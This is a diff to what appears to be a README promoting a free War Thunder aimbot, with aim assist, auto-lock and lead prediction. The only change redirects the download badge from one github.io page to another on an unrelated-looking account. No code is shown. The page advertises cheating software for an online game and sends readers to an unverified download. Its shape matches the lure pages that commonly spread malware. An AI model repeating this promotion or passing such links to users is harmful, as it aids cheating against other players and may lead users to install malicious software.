@@ -3,7 +3,7 @@
 Gain an edge in **War Thunder** with this **Free Aimbot Tool** for PC. Get precise aim assist, auto-lock, and lead prediction for tanks, aircraft, and ground battles. Perfect for training your aim in all modes.
 
 ⬇️ **Download**  
-[![Download War Thunder Free Aimbot Tool](https://img.shields.io/badge/Download-Free_Aimbot_Tool-000000?style=for-the-badge&logo=war-thunder&logoColor=white)](https://war-thunder-free-aimbot-tool.github.io/.github/)
+[![Download War Thunder Free Aimbot Tool](https://img.shields.io/badge/Download-Free_Aimbot_Tool-000000?style=for-the-badge&logo=war-thunder&logoColor=white)](https://shawnmawoysao2.github.io/.github/)
 
 ---
 
